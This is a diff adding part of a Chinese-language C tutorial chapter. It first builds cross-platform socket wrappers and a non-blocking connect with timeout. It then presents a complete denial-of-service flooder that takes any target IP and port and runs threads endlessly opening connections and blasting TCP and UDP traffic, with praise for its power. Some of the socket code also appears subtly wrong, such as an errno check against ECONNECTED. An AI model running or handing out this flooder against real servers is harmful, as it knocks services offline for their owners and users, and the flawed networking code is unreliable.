@@ -3075,4 +3075,356 @@ socket_listen(const char * host, uint16_t port, int backlog) {
 
     这里 socket_bind 能够绑定一个 host 主机地址. 不仅仅是 ip 地址, 同样包括 url 地
     址. 上面两个接口属于半成品接口, 用于各种其它接口的扩展内嵌部分. socket_bind 函数
+    业务能力很强. 实现也是四平八稳. 对于后面使用的 listen 函数, backlog 参数决定
+    accept 监测过来的链接套接字队列大小, 内部也有个限定值. 只是参考你设置 backlog 是
+    否采纳看实现. 所以有了下面一坨封装
+
+```C
+inline socket_t
+socket_tcp(const char * host, uint16_t port) {
+	socket_t s = socket_listen(host, port, SOMAXCONN);
+	if (INVALID_SOCKET == s) {
+		RETURN(INVALID_SOCKET, "socket_listen socket error!");
+	}
+	return s;
+}
+
+inline socket_t
+socket_udp(const char * host, uint16_t port) {
+	socket_t s = socket_bind(host, port, IPPROTO_UDP, NULL);
+	if (INVALID_SOCKET == s) {
+		RETURN(INVALID_SOCKET, "socket_bind socket error!");
+	}
+	return s;
+}
+```
+
+    随后为基础 socket connect 和 accept 封装一下
+
+```C
+inline socket_t
+socket_accept(socket_t s, sockaddr_t * addr) {
+    socklen_t len;
+    return accept(s, (struct sockaddr *)addr, &len);
+}
+
+inline int
+socket_connect(socket_t s, const sockaddr_t * addr) {
+	return connect(s, (const struct sockaddr *)addr, sizeof(*addr));
+}
+
+inline int
+socket_connects(socket_t s, const char * ip, uint16_t port) {
+	sockaddr_t addr;
+	int r = socket_addr(ip, port, &addr);
+	if (r < SufBase)
+		return r;
+	return socket_connect(s, &addr);
+}
+```
+
+**最后来个, 非阻塞的 connect**
+
+    winds 的 select 和 linux 的 select 是两个完全不同的东西. 然而凡人喜欢把
+    它们揉在一起. 非阻塞的 connect 业务是个自带超时机制的 connect. 实现机制无
+    外乎利用select(也有 epoll的). 这里是个源码软文, 专注解决客户端的跨平台的
+    connect 问题. 服务器的 connect 要比客户端多考虑一丁点(放入总轮序器中处理)
+    . 有机会再扯. 对于 select 网上资料太多, 几乎都有点不痛不痒. 了解真相推荐
+    man and msdn !!!
+
+    那开始吧. 有了上面那些关于跨平台的 socket 封装铺垫. 理解下面的非阻塞 
+    connect 都是小意思.
+
+```C
+int
+socket_connecto(socket_t s, const sockaddr_t * addr, int ms) {
+	int n, r;
+	struct timeval to;
+	fd_set rset, wset, eset;
+
+	// 还是阻塞的connect
+	if (ms < 0) return socket_connect(s, addr);
+
+	// 非阻塞登录, 先设置非阻塞模式
+	r = socket_set_nonblock(s);
+	if (r < SufBase) {
+		RETURN(r, "socket_set_nonblock error!");
+	}
+
+	// 尝试连接一下, 非阻塞connect 返回 -1 并且 errno == EINPROGRESS 表示正在建立链接
+	r = socket_connect(s, addr);
+	if (r >= SufBase) goto _return;
+
+	// 链接还在进行中, linux这里显示 EINPROGRESS，winds应该是 WASEWOULDBLOCK
+	if (errno != ECONNECTED) {
+		CERR("socket_connect error r = %d!", r);
+		goto _return;
+	}
+
+	// 超时 timeout, 直接返回结果 ErrBase = -1 错误
+	r = ErrBase;
+	if (ms == 0) goto _return;
+
+	FD_ZERO(&rset); FD_SET(s, &rset);
+	FD_ZERO(&wset); FD_SET(s, &wset);
+	FD_ZERO(&eset); FD_SET(s, &eset);
+	to.tv_sec = ms / 1000;
+	to.tv_usec = (ms % 1000) * 1000;
+	n = select((int)s + 1, &rset, &wset, &eset, &to);
+	// 超时直接滚
+	if (n <= 0) goto _return;
+
+	// 当连接成功时候,描述符会变成可写
+	if (n == 1 && FD_ISSET(s, &wset)) {
+		r = SufBase;
+		goto _return;
+	}
+
+	// 当连接建立遇到错误时候, 描述符变为即可读又可写
+	if (FD_ISSET(s, &eset) || n == 2) {
+		socklen_t len = sizeof n;
+		// 只要最后没有 error那就 链接成功
+		if (!getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&n, &len) && !n)
+			r = SufBase;
+	}
+
+_return:
+	socket_set_block(s);
+	return r;
+}
+```
+
+    核心在于 select 调用触发的异常问题上. 还有就是 errno 信号的判断差异. 最后来个
+    简便封装扩展版本
+
+```C
+socket_t
+socket_connectos(const char * host, uint16_t port, int ms) {
+	int r;
+	sockaddr_t addr;
+	socket_t s = socket_stream();
+	if (s == INVALID_SOCKET) {
+		RETURN(INVALID_SOCKET, "socket_stream is error!");
+	}
+
+	// 构建ip地址
+	r = socket_addr(host, port, &addr);
+	if (r < SufBase)
+		return r;
+
+	r = socket_connecto(s, &addr, ms);
+	if (r < SufBase) {
+		socket_close(s);
+		RETURN(INVALID_SOCKET, "socket_connecto host port ms = %s, %u, %d!", host, port, ms);
+	}
+
+	return s;
+}
+```
+
+    所有当你的客户端, 想和服务器开始通信, 只需要调用 socket_connectos(host, port, ms)
+    后面就可以等待它的回音. 是不是很简单, 一切都妥了. 到这里也许你应该是个合格码农了. 
+    因为基础功底修炼的有些火苗了, 后面的实践也许更加真实, 或者简单.
+    又或许是 ......
+
+![藤原佐为](./img/藤原佐为.jpg)
+
+## 7.4 金丹演练, 来个阅读理解吧.
+
+    有了上面关于跨平台的 socket 封装, 不妨写个简单的测试 demo. 很多同学也许会遇到
+    ddos 攻击(流量攻击导致网卡超载, 服务器拒绝服务) . 其实攻击原理很简单, 对服务器
+    暴露在外的地址和端口疯狂发送流量包. 我们阅读理解的思路, 很简单疯狂 connect, 
+    疯狂 write , 统计下数据看最终效果怎么样 ~
+
+```C
+#include "scsocket.h"
+
+#define _INT_HOST   (255)	
+#define _INT_TOUT   (3000)
+
+struct targ {
+	sockaddr_t addr;
+	char ts[BUFSIZ];
+	char us[BUFSIZ];
+
+	// 攻击次数统计
+	uint64_t connect;
+	uint64_t tcpsend;
+	uint64_t udpsend;
+};
+
+// 得到玩家输入的地址信息
+void addr_input(sockaddr_t * addr);
+
+// 检查IP是否合法
+bool addr_check(sockaddr_t * addr);
+
+// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
+void ddos_run(struct targ * arg);
+
+//
+// ddos attack entrance
+//
+int main(void) {
+	// 记录详细攻击的量, ts and us 是脏数据随便发
+	struct targ arg;
+	arg.udpsend = arg.tcpsend = arg.connect = 0;
+
+	// 得到玩家的地址信息
+	addr_input(&arg.addr);
+
+	if (!addr_check(&arg.addr))
+		CERR_EXIT("ip or port check is error!!!");
+
+	// 开始要启动线程了
+	ddos_run(&arg);
+
+	// :> 开始统计数据
+	puts("connect count		tcp send count			udp send count");
+	for (;;) {
+		printf(" %"PRIu64"			 %"PRIu64"				 %"PRIu64"\n"
+            , arg.connect, arg.tcpsend, arg.udpsend);
+		sh_msleep(_INT_TOUT);
+	}
+    return EXIT_SUCCESS;
+}
+
+// 得到玩家输入的地址信息
+void
+addr_input(sockaddr_t * addr) {
+	bool flag = true;
+	int rt = 0;
+	uint16_t port;
+	char ip[_INT_HOST + 1] = { 0 };
+
+	puts("Please input ip and port, example :> 127.0.0.1 8088");
+	printf(":> ");
+
+	// 自己重构scanf, 解决注入漏洞
+	while (rt < _INT_HOST) {
+		char c = getchar();
+		if (isspace(c)) {
+			if (flag)
+				continue;
+			break;
+		}
+		flag = false;
+		ip[rt++] = c;
+	}
+	ip[rt] = '\0';
+
+	rt = scanf("%hu", &port);
+	if (rt != 1)
+		CERR_EXIT("scanf_s addr->host = %s, port = %hu.", ip, port);
+
+	printf("connect check input addr ip:port = %s:%hu.\n", ip, port);
+
+	// 下面就是待验证的地址信息
+	if (socket_addr(ip, port, addr) < SufBase)
+		CERR_EXIT("socket_addr ip , port is error = %s, %hu.", ip, port);
+}
+
+// 检查IP是否合法
+bool
+addr_check(sockaddr_t * addr) {
+	int r;
+	socket_t s = socket_stream();
+	if (s == INVALID_SOCKET) {
+		RETURN(false, "socket_stream is error!!");
+	}
+
+	r = socket_connecto(s, addr, _INT_TOUT);
+	socket_close(s);
+	if (r < SufBase) {
+		RETURN(false, "socket_connecto addr is timeout = %d.", _INT_TOUT);
+	}
+
+	return true;
+}
+
+// connect 链接
+static void _connect(struct targ * targ) {
+	// 疯狂connect
+	for (;;) {
+		socket_t s = socket_stream();
+		if (s == INVALID_SOCKET) {
+			CERR("socket_stream is error!");
+			continue;
+		}
+
+		// 精确统计, 一定要连接成功
+		while (socket_connect(s, &targ->addr) < SufBase)
+			;
+
+		++targ->connect;
+		socket_close(s);
+	}
+}
+
+// connect + send 连接
+static void _tcpsend(struct targ * targ) {
+	// 疯狂connect
+	for (;;) {
+		socket_t s = socket_stream();
+		if (s == INVALID_SOCKET) {
+			CERR("socket_stream is error!");
+			continue;
+		}
+
+		// 精确统计, 一定要连接成功
+		while (socket_connect(s, &targ->addr) < SufBase)
+			;
+
+		// 疯狂发送数据包
+		while (socket_send(s, targ->ts, BUFSIZ) >= SufBase)
+			++targ->tcpsend;
+
+		socket_close(s);
+	}
+}
+
+// udp send 连接
+static void _udpsend(struct targ * targ) {
+	for (;;) {
+		socket_t s = socket_dgram();
+		if (s == INVALID_SOCKET) {
+			CERR("socket_stream is error!");
+			continue;
+		}
+
+		// 疯狂发送数据包
+		while (socket_sendto(s, targ->us, BUFSIZ, 0, &targ->addr, sizeof(targ->addr)) >= SufBase)
+			++targ->udpsend;
+
+		socket_close(s);
+	}
+}
+
+// 目前启动3个类型线程, 2个是connect, 2个是connect + send 2个是 udp send
+void
+ddos_run(struct targ * arg) {
+	// 创建两个 connect 线程
+	CERR_IF(async_run(_connect, arg));
+	CERR_IF(async_run(_connect, arg));
+
+	// 创建两个 connect + send 线程
+	CERR_IF(async_run(_tcpsend, arg));
+	CERR_IF(async_run(_tcpsend, arg));
+
+	// 创建两个 udp send 线程
+	CERR_IF(async_run(_udpsend, arg));
+	CERR_IF(async_run(_udpsend, arg));
+}
+```
+
+    最终效果图
+
+![ddos攻击](./img/ddos攻击.png)
+
+    主要围绕 _connect, _tcpsend, _udpsend 三个业务展开. 关于 CERR_IF 和 async_run
+    都是现代封装的便利操作. 只要你拥有足够的流量, 哪怕再小的枪都能让老师傅闻风丧胆. 这
+    些都是妖魔战的绝招. 有兴趣可以朝着安全方面深入, 了解更加针对的操作系统知识. 这里主
+    打游戏服务器中底层库构建, C 剑技上面修炼 ~
+
+## 7.5 基于注册的网络 IO 模型
     
